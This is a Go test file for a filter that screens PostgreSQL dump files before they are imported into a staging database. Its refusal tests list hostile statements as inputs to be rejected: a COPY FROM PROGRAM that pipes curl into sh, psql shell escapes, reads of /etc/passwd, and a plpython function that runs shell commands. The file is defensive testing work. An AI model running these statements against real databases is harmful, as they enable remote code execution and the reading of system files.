func checkPGText(text string, o Options) (Decision, error) {
	o.Dialect = core.Postgres
	return Check(core.Statement{Kind: core.StmtOther, Text: []byte(text), Line: 77}, o)
}

// The statements pg_dump 16 and 17 write for a Prisma-style schema are kept.
func TestPGKept(t *testing.T) {
	for _, text := range []string{
		"\\restrict 7qJcIOnqyV0iKEbMfX4ExmjPeERFOsBhj4AGjXuVxyjJjkb4Q7zUhRCbbX4iLa0",
		"\\unrestrict 7qJcIOnqyV0iKEbMfX4ExmjPeERFOsBhj4AGjXuVxyjJjkb4Q7zUhRCbbX4iLa0\n",
		"SET statement_timeout = 0;", "SET lock_timeout = 0;", "SET idle_in_transaction_session_timeout = 0;",
		"SET transaction_timeout = 0;", "SET client_encoding = 'UTF8';", "SET standard_conforming_strings = on;",
		"SELECT pg_catalog.set_config('search_path', '', false);", "SET check_function_bodies = false;",
		"SET xmloption = content;", "SET client_min_messages = warning;", "SET row_security = off;",
		"SET default_tablespace = '';", "SET default_table_access_method = heap;",
		"--\n-- Name: public; Type: SCHEMA; Schema: -; Owner: pg_database_owner\n--\n\nCREATE SCHEMA public;",
		"COMMENT ON SCHEMA public IS 'standard public schema';",
		"CREATE TYPE public.\"Role\" AS ENUM (\n    'USER',\n    'ADMIN'\n);",
		"CREATE TABLE public.\"User\" (\n    id integer NOT NULL,\n    email text NOT NULL,\n    name text,\n    role public.\"Role\" DEFAULT 'USER'::public.\"Role\" NOT NULL\n);",
		"CREATE TABLE public._prisma_migrations (\n    id character varying(36) NOT NULL,\n    checksum character varying(64) NOT NULL\n);",
		"CREATE SEQUENCE public.\"User_id_seq\"\n    AS integer\n    START WITH 1\n    INCREMENT BY 1\n    NO MINVALUE\n    NO MAXVALUE\n    CACHE 1;",
		"ALTER SEQUENCE public.\"User_id_seq\" OWNED BY public.\"User\".id;",
		"ALTER TABLE ONLY public.\"User\" ALTER COLUMN id SET DEFAULT nextval('public.\"User_id_seq\"'::regclass);",
		"COPY public.\"User\" (id, email, name, role) FROM stdin;",
		"SELECT pg_catalog.setval('public.\"User_id_seq\"', 3, true);",
		"ALTER TABLE ONLY public.\"User\"\n    ADD CONSTRAINT \"User_pkey\" PRIMARY KEY (id);",
		"CREATE UNIQUE INDEX \"User_email_key\" ON public.\"User\" USING btree (email);",
		"ALTER TABLE ONLY public.\"Post\"\n    ADD CONSTRAINT \"Post_authorId_fkey\" FOREIGN KEY (\"authorId\") REFERENCES public.\"User\"(id) ON UPDATE CASCADE ON DELETE RESTRICT;",
		"CREATE EXTENSION IF NOT EXISTS \"uuid-ossp\" WITH SCHEMA public;",
		"CREATE EXTENSION IF NOT EXISTS pgcrypto WITH SCHEMA public;",
		"COMMENT ON EXTENSION pgcrypto IS 'cryptographic functions';",
		"ALTER TABLE public.t ALTER COLUMN id ADD GENERATED BY DEFAULT AS IDENTITY (\n    SEQUENCE NAME public.t_id_seq\n    START WITH 1\n);",
		"ALTER TABLE ONLY public.t ATTACH PARTITION public.t_2026 FOR VALUES FROM ('2026-01-01') TO ('2027-01-01');",
		"ALTER TABLE public.t ENABLE ROW LEVEL SECURITY;",
		"DROP TABLE IF EXISTS public.\"User\";",
		"BEGIN;", "COMMIT;",
		"-- just a comment\n",
		"/* nested /* comment */ still */",
	} {
		d, err := checkPGText(text, Options{Name: "prod.sql"})
		if err != nil || d.Verdict != Keep {
			t.Errorf("%q: %+v %v", text, d, err)
		}
	}
}

func TestPGDropped(t *testing.T) {
	for _, c := range []struct{ text, kind string }{
		{"ALTER TABLE public.\"User\" OWNER TO postgres;", "ALTER ... OWNER TO"},
		{"ALTER SCHEMA public OWNER TO pg_database_owner;", "ALTER ... OWNER TO"},
		{"ALTER FUNCTION public.f() OWNER TO app;", "ALTER ... OWNER TO"},
		{"GRANT ALL ON SCHEMA public TO PUBLIC;", "GRANT"},
		{"REVOKE USAGE ON SCHEMA public FROM PUBLIC;", "REVOKE"},
		{"ALTER DEFAULT PRIVILEGES FOR ROLE app IN SCHEMA public GRANT SELECT ON TABLES TO reader;", "ALTER DEFAULT PRIVILEGES"},
		{"CREATE ROLE app;", "CREATE ROLE"},
		{"SET SESSION AUTHORIZATION 'app';", "SET SESSION AUTHORIZATION"},
		{"SET ROLE app;", "SET ROLE"},
		{"CREATE PUBLICATION p FOR ALL TABLES;", "CREATE PUBLICATION"},
	} {
		d, err := checkPGText(c.text, Options{Name: "prod.sql"})
		if err != nil || d.Verdict != Drop || d.Kind != c.kind {
			t.Errorf("%q: %+v %v", c.text, d, err)
		}
	}
}

func TestPGRefused(t *testing.T) {
	for _, c := range []struct{ text, want string }{
		{"\\connect other", `holds a psql meta-command (\connect), which would run on the machine that imports the dump.`},
		{"\\! id", "holds a psql meta-command,"},
		{"\\i /etc/passwd", `holds a psql meta-command (\i)`},
		{"\\restrict a b", `holds a psql meta-command (\restrict)`},
		{"SELECT 1; \\! id", "holds a psql meta-command"},
		{"COPY public.t FROM PROGRAM 'curl http://x | sh';", "holds a COPY ... FROM PROGRAM statement, which would run a command on the staging server."},
		{"COPY public.t (a) FROM '/etc/passwd';", "holds a COPY statement that reads a server file"},
		{"COPY public.t TO '/tmp/t.csv';", "holds a COPY ... TO statement"},
		{"COPY (SELECT 1) TO PROGRAM 'id';", "holds a COPY ... TO PROGRAM statement"},
		{"CREATE FUNCTION public.f() RETURNS trigger LANGUAGE plpgsql AS $$BEGIN RETURN NEW; END;$$;", "holds a CREATE FUNCTION statement, which could run code on the staging database. Pass --keep-routines to keep it, or leave it out of the export."},
		{"CREATE TRIGGER t AFTER UPDATE ON public.\"User\" FOR EACH ROW EXECUTE FUNCTION public.f();", "holds a CREATE TRIGGER statement"},
		{"CREATE VIEW public.v AS SELECT 1;", "holds a CREATE VIEW statement"},
		{"CREATE MATERIALIZED VIEW public.v AS SELECT 1;", "holds a CREATE MATERIALIZED VIEW statement"},
		{"DO $$BEGIN PERFORM 1; END$$;", "holds a DO block, which could run code"},
		{"CREATE SUBSCRIPTION s CONNECTION 'host=prod' PUBLICATION p;", "holds a CREATE SUBSCRIPTION statement, which could connect the staging database to another server."},
		{"CREATE SERVER prod FOREIGN DATA WRAPPER postgres_fdw;", "holds a CREATE SERVER statement"},
		{"CREATE FOREIGN TABLE t (a int) SERVER prod;", "holds a CREATE FOREIGN TABLE statement"},
		{"CREATE USER MAPPING FOR app SERVER prod;", "holds a CREATE USER MAPPING statement"},
		{"CREATE EXTENSION dblink;", "holds a CREATE EXTENSION dblink statement"},
		{"CREATE EXTENSION adminpack;", "holds a CREATE EXTENSION adminpack statement"},
		{"CREATE DATABASE shop;", "holds a CREATE DATABASE statement"},
		{"SELECT pg_read_file('/etc/passwd');", "holds a call to pg_read_file()"},
		{"SELECT pg_catalog.lo_create('16385');", "holds a SELECT statement"},
		{"SELECT pg_catalog.set_config('log_statement', 'all', false);", "holds a SELECT statement"},
		{"SET log_statement = 'all';", "holds a SET log_statement statement"},
		{"SET search_path = (SELECT 1);", "holds a SET statement that reads a query"},
		{"DROP TABLE public.t CASCADE;", "holds a DROP ... CASCADE statement"},
		{"UPDATE public.\"User\" SET email = 'x';", "holds an UPDATE statement that isn't a list of rows"},
		{"CREATE TABLE public.t AS SELECT * FROM public.u;", "holds a CREATE TABLE ... AS statement"},
		{"ALTER TABLE public.t SET TABLESPACE fast;", "holds an ALTER TABLE ... SET TABLESPACE statement"},
		{"CALL public.p();", "holds a CALL statement"},
	} {
		d, err := checkPGText(c.text, Options{Name: "prod.sql"})
		var ce *core.Error
		if d.Verdict != Refuse || !errors.As(err, &ce) || ce.Code != core.ErrDumpRefused || ce.Line != 77 {
			t.Errorf("%q: %v %v", c.text, d.Verdict, err)
			continue
		}
		if !strings.HasPrefix(ce.Msg, "dump-refused: prod.sql line 77 holds ") || !strings.Contains(ce.Msg, c.want) {
			t.Errorf("%q:\n got %s\nwant %s", c.text, ce.Msg, c.want)
		}
	}
}

// Kept PostgreSQL routines are listed; one in an untrusted language
// never is.
func TestPGKeepRoutines(t *testing.T) {
	o := Options{Name: "prod.sql", KeepRoutines: true}
	d, err := checkPGText("CREATE FUNCTION public.touch() RETURNS trigger\n    LANGUAGE plpgsql\n    AS $$\nBEGIN\n  NEW.\"updatedAt\" = now(); -- ; inside\n  RETURN NEW;\nEND;\n$$;", o)
	if err != nil || d.Verdict != Keep || d.Note != "kept CREATE FUNCTION touch (--keep-routines)" {
		t.Errorf("%+v %v", d, err)
	}
	for _, text := range []string{
		"CREATE FUNCTION public.sh(text) RETURNS text LANGUAGE plpython3u AS $$import os; return os.popen(args[0]).read()$$;",
		"CREATE FUNCTION public.f(integer) RETURNS integer AS '$libdir/evil', 'f' LANGUAGE c;",
	} {
		if d, _ := checkPGText(text, o); d.Verdict != Refuse || !strings.Contains(d.Kind, "a function in the language") {
			t.Errorf("%q: %+v", text, d)
		}
	}
}

// pg_dump --clean writes its DROPs first; each must be matched by a
// CREATE later in the dump.
func TestPGFilterClean(t *testing.T) {
	run := func(stmts ...string) error {
		f := NewFilter(Options{Name: "prod.sql", Dialect: core.Postgres})
		for i, s := range stmts {
			if _, err := f.Add(&core.Batch{Pass: &core.Statement{Text: []byte(s), Line: int64(i + 1)}}, mysqlModeZero); err != nil {
				return err
			}
		}
		return f.Finish()
	}
	if err := run("DROP TABLE IF EXISTS public.\"User\";", "DROP SEQUENCE IF EXISTS public.\"User_id_seq\";",
		"CREATE TABLE public.\"User\" (id int);", "CREATE SEQUENCE public.\"User_id_seq\";"); err != nil {
		t.Fatal(err)
	}
	if err := run("DROP TABLE IF EXISTS public.users;", "CREATE TABLE public.\"Users\" (id int);"); err == nil ||
		!strings.Contains(err.Error(), "line 1 holds a DROP TABLE statement") {
		t.Fatalf("err = %v", err)
	}
	// Unquoted names fold to lower case.
	if err := run("DROP TABLE IF EXISTS public.USERS;", "CREATE TABLE public.users (id int);"); err != nil {
		t.Fatal(err)
	}
}
